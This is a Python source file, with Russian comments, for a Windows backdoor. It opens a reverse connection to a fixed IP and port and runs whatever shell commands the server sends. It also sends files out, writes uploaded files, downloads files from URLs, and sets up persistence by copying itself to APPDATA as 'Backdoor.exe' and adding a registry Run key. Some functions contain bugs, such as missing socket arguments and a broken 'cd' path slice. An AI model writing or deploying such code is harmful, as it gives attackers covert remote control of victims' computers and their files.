#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import winreg
import base64 
import requests

#конвектирует данные пайтона в джейсон а его в свою очередь в байты
def reliable_send(data,sock):
        json_data = json.dumps(data).encode()
        sock.send(json_data)

#отправляет большие данные по частям
def reliable_recv(sock):
        json_data = b""
        while True:
                try:
                        json_data += sock.recv(1024)
                        return json.loads(json_data.decode())
                except ValueError:
                        continue

#Скачивает файл
def download(url):
        try:
                get_response = requests.get(url)
                file_name = url.split("/")[-1]
                with open(file_name, "wb") as out_file:
                        out_file.write(get_response.content)
                return f"[+] Файл {file_name} успешно скачан!"
        except Exception as e:
                return f"[!!] Ошибка скачивания файла: {e}"
        

#получает файлы, команды, выполняет и потом отправляет результаты на сервер
def shell(sock):
        while True:
                command = reliable_recv(sock)
                if command == "q":
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        try:
                                os.chdir(command[:3].strip())
                                reliable_send(f"[+] Переход в директорию: {os.getcwd()}")
                        except Exception as e:
                                reliable_send(f"[!!] Ошибка: {e}")
                elif command[:8] == "download":
                        try:
                                with open(command[9:], "rb") as file:
                                        reliable_send(base64.b64encode(file.read()).decode(), sock)
                        except FileNotFoundError:
                                reliable_send("[!!] Файл не найден", sock) 
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as file:
                                data = reliable_recv(sock)
                                try:
                                        file.write(base64.b64decode(data))
                                        reliable_send("[+] Файл успешно загружен", sock)
                                except:
                                        reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)

                elif command[:3] == "get":
                        result = download(command[4:])
                        reliable_send(result, sock)
                else:
                        try:
                                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
                                result = proc.stdout.read() + proc.stderr.read()
                                reliable_send(result.decode(errors="ignore"), sock)
                        except Exception as e:
                                reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)

#повторное подключение
def connection():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.178.67", 54321))
            shell(sock)
            sock.close()
            break  
        except socket.error:
            time.sleep(5)

#создание автозапуска в реестре
def setup_autorun():
        location = os.environ["APPDATA"] + "\\Backdoor.exe"
        if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                try:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as key:
                                winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
                except Exception as e:
                        pass


if __name__ == "__main__":
        setup_autorun()
        connection()

